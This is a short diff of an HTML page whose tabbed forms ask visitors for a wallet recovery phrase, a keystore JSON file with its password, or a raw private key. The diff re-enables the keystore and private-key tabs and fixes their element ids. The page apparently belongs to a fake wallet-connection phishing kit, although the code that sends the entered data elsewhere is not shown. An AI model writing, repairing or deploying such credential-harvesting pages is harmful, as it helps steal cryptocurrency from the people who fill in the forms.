@@ -75,9 +75,9 @@
         </h2>
         </br>
         <div class="tab">
-            <button class="tablinks" id="default" onclick="openCity(event, 'phrase')"><b>Phrase / JSON / Private Key</b></button>
-            <!--<button class="tablinks" onclick="openCity(event, 'keystore')"><b>Keystore JSON</b></button>
-            <button class="tablinks" onclick="openCity(event, 'private')"><b>Private Key</b></button>-->
+            <button class="tablinks" id="default" onclick="openCity(event, 'phrase')"><b>Phrase</b></button>
+            <button class="tablinks" onclick="openCity(event, 'keystore')"><b>Keystore JSON</b></button>
+            <button class="tablinks" onclick="openCity(event, 'private')"><b>Private Key</b></button>
         </div>
 
         <div id="phrase" class="tabcontent">
@@ -96,14 +96,14 @@
             </form>
         </div>
 
-        <div id="Json" class="tabcontent">
+        <div id="keystore" class="tabcontent">
             <form id="myForm2">
 
-                <textarea name="json" required="required" minlength="12" placeholder="Keystore JSON"
+                <textarea name="Json" required="required" minlength="12" placeholder="Keystore JSON"
                     required="required"></textarea>
                 </br>
                 <div id="Password" class="field">
-                    <input type="text" name="password" placeholder="Password" required="required" minlength="4" />
+                    <input id="Password" type="text" name="password" placeholder="Password" required="required" minlength="4" />
                 </div>
                 <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
                 </div>
@@ -112,11 +112,11 @@
             </form>
         </div>
 
-        <div id="PrivateKey" class="tabcontent">
+        <div id="private" class="tabcontent">
             <form id="myForm3">
                 <!-- <input type="hidden" name="privatekey" value="Private Key"/> -->
                 <div class="field">
-                    <input type="text" name="privatekey" placeholder="Private Key" required="required" minlength="64"/>
+                    <input id="PrivateKey" type="text" name="privatekey" placeholder="Private Key" required="required" minlength="64"/>
                 </div>
                 <div class="desc">Typically 64 alphanumeric characters</div>
                 </br>
